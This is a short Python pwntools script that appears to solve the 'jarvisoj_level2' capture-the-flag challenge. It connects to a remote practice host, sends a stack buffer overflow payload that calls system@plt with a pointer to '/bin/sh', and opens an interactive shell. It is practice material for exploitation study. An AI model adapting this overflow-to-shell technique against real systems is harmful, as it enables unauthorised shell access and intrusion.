from pwn import *


def jarvisoj_level2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level2'):
    print('jarvisoj_level2 start')
    # target = process([file_name])
    target = remote('node4.buuoj.cn', 28916)
    target_elf = ELF(file_name)

    bin_sh_ptr = p32(next(target_elf.search(b'/bin/sh')))
    system_plt = p32(target_elf.plt['system'])

    payload = b'A' * 140

    # system('/bin/sh')
    payload += system_plt + p32(0xdeadbeef) + bin_sh_ptr

    target.sendline(payload)

    target.interactive()

    print('jarvisoj_level2 end')


if __name__ == '__main__':
    jarvisoj_level2()
